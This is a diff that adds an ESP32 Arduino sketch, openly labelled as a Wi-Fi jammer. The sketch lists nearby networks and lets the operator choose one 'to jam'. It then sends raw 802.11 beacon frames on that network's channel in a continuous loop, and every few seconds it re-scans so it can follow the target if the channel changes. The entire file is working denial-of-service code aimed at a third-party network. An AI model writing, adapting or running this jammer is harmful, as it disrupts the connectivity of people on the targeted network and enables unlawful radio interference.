@@ -1,0 +1,125 @@
+#include <WiFi.h>
+#include "esp_wifi.h"
+
+int current_channel = 1;
+String target_ssid = "";  // The SSID of the network you want to jam
+int target_channel = -1;  // Channel of the target network (-1 means not set)
+int scan_interval = 5000; // Interval to scan for channel changes (in milliseconds)
+unsigned long last_scan_time = 0;
+
+struct NetworkInfo {
+  String ssid;
+  int channel;
+};
+
+NetworkInfo network_list[50]; // Store up to 50 networks
+int network_count = 0;
+
+// Example large packet data to generate noise
+uint8_t noisePacket[] = {
+  0x80, 0x00, // Frame Control (beacon frame)
+  0x00, 0x00, // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
+  0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source (example MAC)
+  0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // BSSID (example MAC)
+  0x00, 0x00, // Sequence number
+  // Additional payload to make packet larger
+  0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x69, 0x46, 0x69, // "Hello WiFi"
+  0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, // Padding
+  0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21  // More padding
+};
+
+const size_t packetLength = sizeof(noisePacket); // Ensure the packet size matches the buffer size
+
+void sendNoisePacket() {
+  if (packetLength < 20) { // Minimum valid length for 802.11 frames
+    Serial.println("Error: Packet too short");
+    return;
+  }
+
+  // Send raw packet to generate noise
+  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, noisePacket, packetLength, false);
+  if (result == ESP_OK) {
+    Serial.println("Sent noise packet");
+  } else {
+    Serial.print("Failed to send packet, error code: ");
+    Serial.println(result);
+  }
+}
+
+int findTargetChannel() {
+  // Scan for available networks and check the target SSID
+  int n = WiFi.scanNetworks();
+  for (int i = 0; i < n; i++) {
+    if (WiFi.SSID(i) == target_ssid) {
+      return WiFi.channel(i); // Return the channel of the target network
+    }
+  }
+  return -1; // Return -1 if target SSID is not found
+}
+
+void scanWiFiNetworks() {
+  Serial.println("Scanning for Wi-Fi networks...");
+  network_count = WiFi.scanNetworks();
+  
+  if (network_count == 0) {
+    Serial.println("No networks found");
+  } else {
+    Serial.println("Networks found:");
+    for (int i = 0; i < network_count; ++i) {
+      network_list[i].ssid = WiFi.SSID(i);
+      network_list[i].channel = WiFi.channel(i);
+      // Print SSID, RSSI (signal strength), and Channel
+      Serial.printf("%d: %s (RSSI: %d) [Channel: %d]\n", 
+                    i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i), WiFi.channel(i));
+    }
+  }
+  Serial.println("");
+}
+
+void setup() {
+  Serial.begin(115200);
+  while (!Serial); // Wait for Serial to initialize
+
+  WiFi.mode(WIFI_STA); // Set Wi-Fi mode to Station (client)
+  esp_wifi_set_promiscuous(true); // Enable promiscuous mode to send raw packets
+
+  // Start Wi-Fi network scanning and display networks
+  scanWiFiNetworks();
+
+  // Ask the user to input the number corresponding to the network to jam
+  Serial.println("Enter the number of the network you want to jam: ");
+  while (!Serial.available()); // Wait for user input
+  int network_number = Serial.parseInt();
+
+  // Validate network selection
+  if (network_number > 0 && network_number <= network_count) {
+    target_ssid = network_list[network_number - 1].ssid;
+    target_channel = network_list[network_number - 1].channel;
+    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("Target network selected: %s (Channel %d)\n", target_ssid.c_str(), target_channel);
+  } else {
+    Serial.println("Invalid network number. Restart and try again.");
+    while (true); // Halt the program if the network is not selected correctly
+  }
+
+  last_scan_time = millis(); // Initialize scan timer
+  Serial.println("Wi-Fi initialized, starting noise packet transmission...");
+}
+
+void loop() {
+  // Continuously send noise packets on the target channel
+  sendNoisePacket();
+
+  // Periodically scan to check if the target network changed its channel
+  unsigned long current_time = millis();
+  if (current_time - last_scan_time > scan_interval) {
+    int new_channel = findTargetChannel();
+    if (new_channel != -1 && new_channel != target_channel) {
+      target_channel = new_channel;
+      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+      Serial.printf("Target network changed channel. Now jamming channel: %d\n", target_channel);
+    }
+    last_scan_time = current_time; // Reset scan timer
+  }
+}
